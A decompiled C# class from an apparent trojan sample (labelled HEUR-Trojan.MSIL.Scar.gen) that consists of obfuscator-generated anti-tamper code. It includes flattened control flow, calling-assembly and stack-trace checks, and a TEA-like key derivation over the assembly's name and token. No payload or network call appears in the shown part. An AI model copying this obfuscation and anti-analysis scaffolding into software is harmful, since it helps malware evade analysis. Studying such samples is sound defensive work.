// Decompiled with JetBrains decompiler
// Type: Arrznfhcz.Expressions.Policy
// Assembly: ConsoleApp13, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B655A79A-67BF-4D11-3C9F-30AAF7B05A65
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Scar.gen-9cde0d9eb4a1bd5801ecea6dca2b0883ce6136a99ec76c4e9dbcbbf06f186f49.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace Arrznfhcz.Expressions
{
  internal static class Policy
  {
    private static Policy.ThreadPoolAdapter _Property = new Policy.ThreadPoolAdapter();
    private static Policy OrderWrapper;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static long WriteObserver()
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_3;
          case 2:
            if ((object) Assembly.GetCallingAssembly() == (object) typeof (Policy).Assembly)
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_5e44441515b64910b83390b1e3b9c6cb == 0)
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            }
            else
              goto label_45;
          default:
            goto label_45;
        }
      }
label_3:
      if (Policy.RemoveWrapper())
      {
        long num3;
        lock (Policy._Property)
        {
          long specstart = Policy._Property.AddObserver();
          if (specstart != 0L)
            goto label_13;
          else
            goto label_32;
label_5:
          int num4;
          int num5 = num4;
label_6:
          List<byte> byteList;
          byte[] collection;
          Assembly executingAssembly;
          while (true)
          {
            ulong num6;
            int num7;
            AssemblyName assemblyName;
            int num8;
            int index;
            int count;
            switch (num5)
            {
              case 1:
                try
                {
                  assemblyName = (AssemblyName) Policy.MoveWrapper((object) executingAssembly);
                  goto case 7;
                }
                catch
                {
                  int num9 = 0;
                  if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e187c2a42569408a813305f8967bc5d0 == 0)
                  {
                    int num10;
                    num9 = num10;
                  }
                  switch (num9)
                  {
                    default:
                      assemblyName = new AssemblyName(executingAssembly.FullName);
                      goto label_10;
                  }
                }
              case 2:
                goto label_42;
              case 3:
                byteList.Add((byte) (num8 >> 8));
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e749e26f727a446ca597537953d7d4ed == 0)
                {
                  num5 = 15;
                  continue;
                }
                goto label_5;
              case 4:
                byteList.Add((byte) (num7 >> 16));
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_441ffa2bcea24078bfac17cfb5622c2e != 0)
                {
                  num5 = 16;
                  continue;
                }
                goto label_5;
              case 5:
                byteList.AddRange((IEnumerable<byte>) Policy.PushWrapper((object) Encoding.Unicode, (object) assemblyName.Name));
                num8 = Policy.StopObserver(typeof (Policy));
                num5 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_190fd51578fc4335a7f878acfc8ea0b3 == 0 ? 0 : 0;
                continue;
              case 6:
label_30:
                num6 += (ulong) byteList[index];
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_bc26819773b3449b89fd956b3e31a805 == 0)
                {
                  num5 = 21;
                  continue;
                }
                goto label_5;
              case 7:
label_10:
                collection = assemblyName.GetPublicKeyToken();
                if (collection == null)
                {
                  num5 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_63a7b40bc45a4904ac2ec31aeee5b3d1 == 0 ? 7 : 8;
                  continue;
                }
                if (collection.Length == 0)
                {
                  if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_72a4a505abe94573b637d2005211475b == 0)
                  {
                    num5 = 10;
                    continue;
                  }
                  goto label_5;
                }
                else
                  goto case 8;
              case 8:
                if (collection != null)
                {
                  num5 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_c01d8930102341939fcf775d628a6ec2 == 0 ? 9 : 14;
                  continue;
                }
                goto case 5;
              case 9:
                ulong num11 = num6 + (num6 << 6);
                ulong num12 = num11 ^ num11 >> 22;
                num6 = num12 + (num12 << 30);
                specstart = (long) num6 ^ -4523305947957995326L;
                num5 = 17;
                continue;
              case 10:
                collection = (byte[]) null;
                goto case 8;
              case 11:
                byteList.Add((byte) (num8 >> 16));
                byteList.Add((byte) (num7 >> 8));
                byteList.Add((byte) (num8 >> 24));
                num5 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_978b11593bae4798902b5b1b913ccb2f == 0 ? 3 : 4;
                continue;
              case 12:
                goto label_13;
              case 13:
                byteList = new List<byte>();
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_7288b009871b4477a2047e9e1056cc42 == 0)
                {
                  num5 = 1;
                  continue;
                }
                goto label_5;
              case 14:
                goto label_27;
              case 15:
                byteList.Add((byte) (num7 >> 24));
                num5 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_952d30080a2b4d7695adb241383fefdb == 0 ? 8 : 11;
                continue;
              case 16:
                byteList.Add((byte) num8);
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_c044535dfbcd4097a03175dc8cd7bc0e == 0)
                {
                  num5 = 19;
                  continue;
                }
                goto label_5;
              case 17:
                Policy._Property.PatchObserver(specstart);
                num5 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_0dd863ab6ed14241aa15ed1dfcc266fd == 0 ? 9 : 12;
                continue;
              case 18:
                byteList[index] = (byte) 0;
                ++index;
                break;
              case 19:
                byteList.Add((byte) num7);
                count = byteList.Count;
                num6 = 0UL;
                index = 0;
                break;
              case 20:
                goto label_22;
              case 21:
                ulong num13 = num6 + (num6 << 20);
                num6 = num13 ^ num13 >> 12;
                num5 = 18;
                continue;
              default:
                num7 = Policy.ContextStatusStructBuilder.UpdateObserver();
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_da40be43f0044659847cb314b955d255 == 0)
                {
                  num5 = 3;
                  continue;
                }
                goto label_5;
            }
            if (index == count)
              num5 = 9;
            else
              goto label_30;
          }
label_22:
          executingAssembly = Assembly.GetExecutingAssembly();
          num4 = 13;
          goto label_5;
label_27:
          byteList.AddRange((IEnumerable<byte>) collection);
          num4 = 5;
          goto label_5;
label_13:
          num3 = specstart;
          num5 = 2;
          goto label_6;
label_32:
          num4 = 20;
          goto label_5;
        }
label_42:
        return num3;
      }
label_45:
      return 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool ForgotObserver() => Policy.CustomizeObserver();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool CustomizeObserver()
    {
      int num1 = 6;
label_1:
      int num2 = num1;
      Type type1;
      while (true)
      {
        MethodBase methodBase1;
        StackTrace stackTrace;
        MethodBase methodBase2;
        Type type2;
        switch (num2)
        {
          case 1:
            methodBase2 = (MethodBase) null;
            break;
          case 2:
            type2 = Policy.RegisterWrapper((object) methodBase1);
            goto label_23;
          case 3:
            if ((object) methodBase1 != null)
            {
              num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8cf8a65ced8c48c99edb56b7fec22679 != 0 ? 2 : 2;
              continue;
            }
            type2 = (Type) null;
            goto label_23;
          case 4:
            goto label_8;
          case 5:
            StackFrame frame = stackTrace.GetFrame(3);
            if (frame == null)
            {
              num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_1d907c9fd7d545a1b0574c801c287491 == 0 ? 1 : 0;
              continue;
            }
            methodBase2 = frame.GetMethod();
            break;
          case 6:
            stackTrace = new StackTrace();
            num2 = 5;
            continue;
          case 7:
            goto label_19;
          default:
            if ((object) type1 == (object) typeof (RuntimeMethodHandle))
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_a14a1ce129054704abcf1a975c0f7335 != 0)
              {
                num2 = 4;
                continue;
              }
              goto label_1;
            }
            else
            {
              if ((object) type1 != null)
              {
                num2 = 7;
                continue;
              }
              goto label_18;
            }
        }
        methodBase1 = methodBase2;
        num2 = 3;
        continue;
label_23:
        type1 = type2;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_0dd863ab6ed14241aa15ed1dfcc266fd != 0)
          num2 = 0;
        else
          goto label_1;
      }
label_8:
      return false;
label_18:
      return false;
label_19:
      // ISSUE: type reference
      return (object) type1.Assembly == (object) Policy.CalculateWrapper(__typeref (Policy)).Assembly;
    }

    private static int StopObserver(Type instance) => instance.MetadataToken;

    internal static bool RemoveWrapper() => Policy.ForgotObserver();

    internal static object MoveWrapper([In] object obj0) => (object) ((Assembly) obj0).GetName();

    internal static object PushWrapper([In] object obj0, [In] object obj1) => (object) ((Encoding) obj0).GetBytes((string) obj1);

    internal static bool ExcludeWrapper() => Policy.OrderWrapper == null;

    internal static Policy SetupWrapper() => Policy.OrderWrapper;

    internal static Type RegisterWrapper([In] object obj0) => ((MemberInfo) obj0).DeclaringType;

    internal static Type CalculateWrapper([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    private sealed class ThreadPoolAdapter
    {
      private int m_Invocation;
      private int m_Info;
      internal static Policy.ThreadPoolAdapter DeleteWrapper;

      internal ThreadPoolAdapter()
      {
        this.PatchObserver(0L);
        int num1 = 0;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_3050edffe1c444e59832d44e047e2092 == 0)
          goto label_3;
label_1:
        switch (num1)
        {
          case 0:
            return;
          default:
            return;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal long AddObserver()
      {
        // ISSUE: type reference
        if ((object) Assembly.GetCallingAssembly() != (object) Policy.ThreadPoolAdapter.AddWrapper(__typeref (Policy.ThreadPoolAdapter)).Assembly || !Policy.ForgotObserver())
          return 2918384;
        int[] numArray = new int[4];
        int num1 = 9;
        if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_0b64a11cb53740a3b3ab30e023492f59 != 0)
          goto label_2;
label_1:
        int num2;
        num1 = num2;
label_2:
        int num3;
        int info;
        ulong num4;
        int num5;
        int invocation;
        int num6;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num6 -= num5;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_5013aa710397498893ebe7b3154eb1a9 == 0)
              {
                num1 = 0;
                continue;
              }
              goto label_1;
            case 2:
              num4 |= (ulong) (uint) invocation;
              num1 = 12;
              continue;
            case 3:
              numArray[2] = ~--~-~-~~-~-1700634115;
              num1 = 8;
              continue;
            case 4:
              if (num3 == 32)
              {
                for (int index = 0; index != 4; ++index)
                  numArray[index] = 0;
                num4 = (ulong) info << 32;
                num1 = 2;
                continue;
              }
              goto case 7;
            case 5:
              goto label_21;
            case 6:
              numArray[1] = ~--~~-~-~10955577;
              num1 = 3;
              continue;
            case 7:
              info -= (invocation << 4 ^ invocation >> 5) + invocation ^ num6 + numArray[num6 >> 11 & 3];
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_6023c49d8ec34836b214563739bc0226 == 0)
              {
                num1 = 1;
                continue;
              }
              goto label_1;
            case 8:
              numArray[0] = -~~-~-~--~~-1390913400;
              num1 = 10;
              continue;
            case 9:
              numArray[3] = -~~-~-~--~~1335914900;
              num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e97aaa4b94c0428f89cc563a57dd7e43 == 0 ? 6 : 2;
              continue;
            case 10:
              invocation = this.m_Invocation;
              num1 = 11;
              continue;
            case 11:
              info = this.m_Info;
              num5 = -~~-~-~-~1640531524;
              num6 = -~-~-~~--~~957401314;
              num3 = 0;
              goto case 4;
            case 12:
              goto label_14;
            default:
              goto label_15;
          }
        }
label_14:
        return (long) num4;
label_15:
        invocation -= (info << 4 ^ info >> 5) + info ^ num6 + numArray[num6 & 3];
        num2 = 5;
        goto label_1;
label_21:
        ++num3;
        num2 = 4;
        goto label_1;
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal void PatchObserver(long specstart)
      {
        int num1 = 3;
label_1:
        int num2 = num1;
        int index;
        int[] numArray;
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        while (true)
        {
          switch (num2)
          {
            case 1:
              num7 = ~--~-~-~~-~1640531527;
              num2 = 7;
              continue;
            case 2:
              goto label_22;
            case 3:
              // ISSUE: type reference
              if ((object) Assembly.GetCallingAssembly() == (object) Policy.ThreadPoolAdapter.AddWrapper(__typeref (Policy.ThreadPoolAdapter)).Assembly)
              {
                if (Policy.ThreadPoolAdapter.DefineWrapper())
                {
                  numArray = new int[4]
                  {
                    0,
                    -~~--~-~~10955581,
                    0,
                    0
                  };
                  numArray[0] = -~~--~-~~-~-1390913398;
                  num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_7cfc2c03ff6649e2ad246e3cf4ba10a4 != 0 ? 0 : 0;
                  continue;
                }
                goto label_10;
              }
              else
              {
                num2 = 2;
                continue;
              }
            case 4:
              num6 += num7;
              num5 += (num3 << 4 ^ num3 >> 5) + num3 ^ num6 + numArray[num6 >> 11 & 3];
              ++num4;
              num2 = 5;
              continue;
            case 5:
            case 12:
              if (num4 == 32)
              {
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_974bfc6db9cf40db98d2a42a90779011 != 0)
                {
                  num2 = 11;
                  continue;
                }
                goto label_1;
              }
              else
              {
                num3 += (num5 << 4 ^ num5 >> 5) + num5 ^ num6 + numArray[num6 & 3];
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_cb7010e75cb34c81864fdc89443c1896 == 0)
                {
                  num2 = 4;
                  continue;
                }
                goto label_1;
              }
            case 6:
              this.m_Invocation = num3;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_994f498085e14f5fac4670072b1ed92f == 0)
              {
                num2 = 13;
                continue;
              }
              goto label_1;
            case 7:
              num3 = (int) specstart;
              num5 = (int) (specstart >> 32);
              num2 = 8;
              continue;
            case 8:
              num6 = 0;
              num4 = 0;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_1557e7f9a28744318187cac672b3e64a == 0)
              {
                num2 = 12;
                continue;
              }
              goto label_1;
            case 9:
              ++index;
              num2 = 14;
              continue;
            case 10:
              numArray[3] = -~~--~-~~1335914903;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_17a4a8c0b9c34bb68e273562658de821 != 0)
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            case 11:
              index = 0;
              goto case 14;
            case 13:
              goto label_20;
            case 14:
              if (index != 4)
              {
                numArray[index] = 0;
                num2 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_898c0605ac9640458e59804baf843842 == 0 ? 7 : 9;
                continue;
              }
              num2 = 6;
              continue;
            default:
              numArray[2] = -~~-~--~~-~-1700634117;
              num2 = 10;
              continue;
          }
        }
label_22:
        return;
label_10:
        return;
label_20:
        this.m_Info = num5;
      }

      internal static bool SearchWrapper() => Policy.ThreadPoolAdapter.DeleteWrapper == null;

      internal static Policy.ThreadPoolAdapter PostWrapper() => Policy.ThreadPoolAdapter.DeleteWrapper;

      internal static Type AddWrapper([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

      internal static bool DefineWrapper() => Policy.ForgotObserver();
    }

    private sealed class CodeStateConfig
    {
      internal static Policy.CodeStateConfig UpdateWrapper;

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static int EnableObserver() => Policy.Registry.MoveObserver(Policy.StopObserver(Policy.CodeStateConfig.CompareWrapper(__typeref (Policy.CodeStateConfig))), Policy.Registry.NewObserver(Policy.Registry.RunObserver(Policy.StopObserver(typeof (Policy.TokenizerModelStatus)), Policy.StopObserver(typeof (Policy.ContextStatusStructBuilder))), Policy.CodeStateConfig.IncludeWrapper(Policy.StopObserver(Policy.CodeStateConfig.CompareWrapper(__typeref (Policy.Writer))) ^ ~-~--~~-~291685046, Policy.TokenizerModelStatus.RestartObserver())));

      internal static Type CompareWrapper([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

      internal static int IncludeWrapper(int param_Position, int vis_high) => Policy.Registry.NewObserver(param_Position, vis_high);

      internal static bool ResolveWrapper() => Policy.CodeStateConfig.UpdateWrapper == null;

      internal static Policy.CodeStateConfig LoginWrapper() => Policy.CodeStateConfig.UpdateWrapper;
    }

    private static class Registry
    {
      internal static Policy.Registry PrepareWrapper;

      internal static int MoveObserver(int no__item, int selection) => no__item ^ selection - -~-~~--~~-~-222051967;

      internal static int RunObserver(int end_config, int ivk_offset) => end_config - -~-~-~~-~-748205785 ^ ivk_offset + -~-~-~~-~194857700;

      internal static int NewObserver(int param_Position, int vis_high) => param_Position ^ vis_high - ~--~~--~-~~-2068129196 ^ param_Position - vis_high;

      internal static bool StartWrapper() => Policy.Registry.PrepareWrapper == null;

      internal static Policy.Registry ValidateWrapper() => Policy.Registry.PrepareWrapper;
    }

    private sealed class ContextStatusStructBuilder
    {
      internal static Policy.ContextStatusStructBuilder ChangeWrapper;

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static int UpdateObserver() => Policy.Registry.NewObserver(Policy.ContextStatusStructBuilder.ConnectWrapper(Policy.StopObserver(typeof (Policy.AnnotationStateConfig)), Policy.Registry.NewObserver(Policy.StopObserver(Policy.ContextStatusStructBuilder.AwakeWrapper(__typeref (Policy.ContextStatusStructBuilder))), Policy.StopObserver(typeof (Policy.TokenizerModelStatus)))), Policy.ContextStatusStructBuilder.ResetWrapper());

      internal static Type AwakeWrapper([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

      internal static int ConnectWrapper(int end_config, int ivk_offset) => Policy.Registry.RunObserver(end_config, ivk_offset);

      internal static int ResetWrapper() => Policy.CodeStateConfig.EnableObserver();

      internal static bool StopWrapper() => Policy.ContextStatusStructBuilder.ChangeWrapper == null;

      internal static Policy.ContextStatusStructBuilder SetWrapper() => Policy.ContextStatusStructBuilder.ChangeWrapper;
    }

    private sealed class AnnotationStateConfig
    {
      private static Policy.AnnotationStateConfig WriteWrapper;

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static int SortObserver() => Policy.AnnotationStateConfig.FlushWrapper(Policy.AnnotationStateConfig.TestWrapper(typeof (Policy.Writer)), Policy.StopObserver(Policy.AnnotationStateConfig.ManageWrapper(__typeref (Policy.RegistryParameterManager))) ^ Policy.Registry.RunObserver(Policy.StopObserver(typeof (Policy.AnnotationStateConfig)), Policy.Registry.NewObserver(Policy.StopObserver(Policy.AnnotationStateConfig.ManageWrapper(__typeref (Policy.CodeStateConfig))), Policy.RegistryParameterManager.VerifyObserver())));

      internal static int TestWrapper(Type instance) => Policy.StopObserver(instance);

      internal static Type ManageWrapper([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

      internal static int FlushWrapper(int no__item, int selection) => Policy.Registry.MoveObserver(no__item, selection);

      internal static bool CountWrapper() => Policy.AnnotationStateConfig.WriteWrapper == null;

      internal static Policy.AnnotationStateConfig ViewWrapper() => Policy.AnnotationStateConfig.WriteWrapper;
    }

    private sealed class Writer
    {
      private static Policy.Writer ReflectWrapper;

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static int PrepareObserver() => Policy.Registry.NewObserver(Policy.Registry.MoveObserver(Policy.Writer.SelectWrapper() ^ -~-~~--~~-527758445, Policy.StopObserver(typeof (Policy.RegistryParameterManager))), Policy.Writer.CollectCollection(Policy.Writer.CustomizeCollection(Policy.Writer.RevertWrapper(__typeref (Policy.ContextStatusStructBuilder))) ^ Policy.StopObserver(typeof (Policy.CodeStateConfig)), -~-~-~~--~~-188735298));

      internal static int SelectWrapper() => Policy.AnnotationStateConfig.SortObserver();

      internal static Type RevertWrapper([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

      internal static int CustomizeCollection(Type instance) => Policy.StopObserver(instance);

      internal static int CollectCollection(int end_config, int ivk_offset) => Policy.Registry.RunObserver(end_config, ivk_offset);

      internal static bool PrintWrapper() => Policy.Writer.ReflectWrapper == null;

      internal static Policy.Writer InvokeWrapper() => Policy.Writer.ReflectWrapper;
    }

    private sealed class RegistryParameterManager
    {
      private static Policy.RegistryParameterManager LogoutCollection;

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static int VerifyObserver() => Policy.Registry.NewObserver(Policy.RegistryParameterManager.MapCollection(typeof (Policy.RegistryParameterManager)), Policy.RegistryParameterManager.PatchCollection(Policy.StopObserver(typeof (Policy.ContextStatusStructBuilder)), Policy.RegistryParameterManager.QueryCollection(Policy.RegistryParameterManager.MapCollection(typeof (Policy.AnnotationStateConfig)), Policy.Registry.NewObserver(Policy.RegistryParameterManager.MapCollection(typeof (Policy.Writer)), Policy.Registry.MoveObserver(Policy.RegistryParameterManager.MapCollection(typeof (Policy.TokenizerModelStatus)), Policy.RegistryParameterManager.MapCollection(Policy.RegistryParameterManager.InstantiateCollection(__typeref (Policy.CodeStateConfig))))))));

      internal static int MapCollection(Type instance) => Policy.StopObserver(instance);

      internal static Type InstantiateCollection([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

      internal static int QueryCollection(int end_config, int ivk_offset) => Policy.Registry.RunObserver(end_config, ivk_offset);

      internal static int PatchCollection(int no__item, int selection) => Policy.Registry.MoveObserver(no__item, selection);

      internal static bool SortCollection() => Policy.RegistryParameterManager.LogoutCollection == null;

      internal static Policy.RegistryParameterManager ConcatCollection() => Policy.RegistryParameterManager.LogoutCollection;
    }

    private sealed class TokenizerModelStatus
    {
      internal static Policy.TokenizerModelStatus InsertCollection;

      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static int RestartObserver() => Policy.Registry.RunObserver(Policy.TokenizerModelStatus.ListCollection(Policy.Writer.PrepareObserver(), Policy.TokenizerModelStatus.PublishCollection(Policy.StopObserver(Policy.TokenizerModelStatus.RateCollection(__typeref (Policy.TokenizerModelStatus))), Policy.AnnotationStateConfig.SortObserver())), Policy.TokenizerModelStatus.FillCollection(typeof (Policy.CodeStateConfig)));

      internal static Type RateCollection([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

      internal static int PublishCollection(int no__item, int selection) => Policy.Registry.MoveObserver(no__item, selection);

      internal static int ListCollection(int end_config, int ivk_offset) => Policy.Registry.RunObserver(end_config, ivk_offset);

      internal static int FillCollection(Type instance) => Policy.StopObserver(instance);

      internal static bool VerifyCollection() => Policy.TokenizerModelStatus.InsertCollection == null;

      internal static Policy.TokenizerModelStatus GetCollection() => Policy.TokenizerModelStatus.InsertCollection;
    }
  }
}
